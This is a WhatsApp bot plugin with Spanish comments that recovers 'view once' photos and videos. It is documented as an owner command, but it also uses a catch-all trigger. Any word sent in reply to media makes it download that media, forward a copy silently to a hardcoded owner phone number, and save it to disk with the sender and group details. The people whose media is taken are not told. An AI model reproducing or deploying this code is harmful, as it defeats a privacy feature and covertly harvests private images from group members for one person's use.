// 📂 plugins/_ver.js — FelixCat-Bot 🐾
// ver / r → recupera en el grupo (SOLO OWNER)
// cualquier palabra → recupera y manda SOLO al privado del OWNER
// si responde a view once → lo recupera igual y lo manda SOLO al OWNER

import fs from 'fs'
import path from 'path'
import { webp2png } from '../lib/webp2mp4.js'

const OWNER_FIXED = '59898719147@s.whatsapp.net'

let handler = async (m, { conn, command }) => {

  const text = m.text?.toLowerCase() || ''
  const isAnyWord = text.length > 0

  // ✅ Detectar owner
  const owners = global.owner.map(o => o[0].replace(/[^0-9]/g, ''))
  const senderNumber = m.sender.replace(/[^0-9]/g, '')
  const isOwner = owners.includes(senderNumber)

  // ✅ Modo grupo solo si es owner + ver/r
  const isGroupMode = isOwner && ['ver', 'r'].includes(command)

  // ✅ Si no es owner y no escribió nada → ignorar
  if (!isGroupMode && !isAnyWord) return

  try {
    const q = m.quoted
    if (!q) return

    // ✅ DETECTAR VIEW ONCE REAL
    const viewOnce =
      q.message?.viewOnceMessageV2?.message ||
      q.message?.viewOnceMessageV2Extension?.message

    let buffer, mime, type, filenameSent, sentMessage = null

    if (viewOnce) {
      // ✅ VIEW ONCE REAL
      const mediaType = Object.keys(viewOnce)[0]
      const mediaMsg = viewOnce[mediaType]
      mime = mediaMsg.mimetype || ''

      buffer = await conn.downloadMediaMessage({
        message: viewOnce,
        key: q.key
      })

      type = mediaType.includes('video') ? 'video' : 'image'
      filenameSent = `recuperado.${mime.split('/')[1] || 'jpg'}`

    } else {
      // ✅ MULTIMEDIA NORMAL
      mime = q.mimetype || q.mediaType || ''
      if (!/webp|image|video/g.test(mime)) return

      buffer = await q.download()
      type = mime.startsWith('video') ? 'video' : 'image'
      filenameSent = 'recuperado.' + mime.split('/')[1]
    }

    // ✅ REACCIÓN PARA USUARIOS NORMALES
    if (!isOwner) await m.react('✅')
    if (isGroupMode) await m.react('📥')

    // ✅ STICKER → PNG
    if (/webp/.test(mime)) {
      let result = await webp2png(buffer)
      if (result?.url) {
        buffer = Buffer.from(await (await fetch(result.url)).arrayBuffer())
        filenameSent = 'sticker.png'
        type = 'image'
      }
    }

    // ✅ SI ES OWNER CON ver/r → MANDAR AL GRUPO
    if (isGroupMode) {
      sentMessage = await conn.sendMessage(
        m.chat,
        { [type]: buffer, fileName: filenameSent, caption: '📸 Archivo recuperado.' },
        { quoted: null }
      )

      await conn.sendMessage(m.chat, {
        react: { text: '✅', key: sentMessage.key }
      })
    }

    // ✅ SIEMPRE MANDAR COPIA AL OWNER
    await conn.sendMessage(
      OWNER_FIXED,
      { [type]: buffer, fileName: filenameSent, caption: '📩 Archivo recuperado automáticamente.' },
      { quoted: null }
    )

    // ✅ GUARDAR MEDIA
    const mediaFolder = './media'
    if (!fs.existsSync(mediaFolder)) fs.mkdirSync(mediaFolder)

    global.db.data.mediaList = global.db.data.mediaList || []

    const filename = `${Date.now()}_${Math.floor(Math.random() * 9999)}`
    const extFile = filenameSent.split('.').pop()
    const finalName = `${filename}.${extFile}`
    const filepath = path.join(mediaFolder, finalName)

    fs.writeFileSync(filepath, buffer)

    let chatInfo = null
    if (m.isGroup) {
      try { chatInfo = await conn.groupMetadata(m.chat) } catch {}
    }

    global.db.data.mediaList.push({
      id: global.db.data.mediaList.length + 1,
      filename: finalName,
      path: filepath,
      type,
      from: m.sender,
      groupId: m.isGroup ? m.chat : null,
      groupName: m.isGroup ? (chatInfo?.subject || '') : null,
      date: new Date().toLocaleString(),
      savedByVer: true
    })

  } catch (e) {
    console.error(e)
    if (isGroupMode) await m.react('✖️')
  }
}

// ✅ SOLO EL OWNER PUEDE USAR ver y r
handler.help = ['ver', 'r']
handler.tags = ['tools', 'owner']
handler.command = ['ver', 'r']

// ✅ CUALQUIER PALABRA SIN PREFIJO
handler.customPrefix = /.*/
handler.command = new RegExp()

export default handler
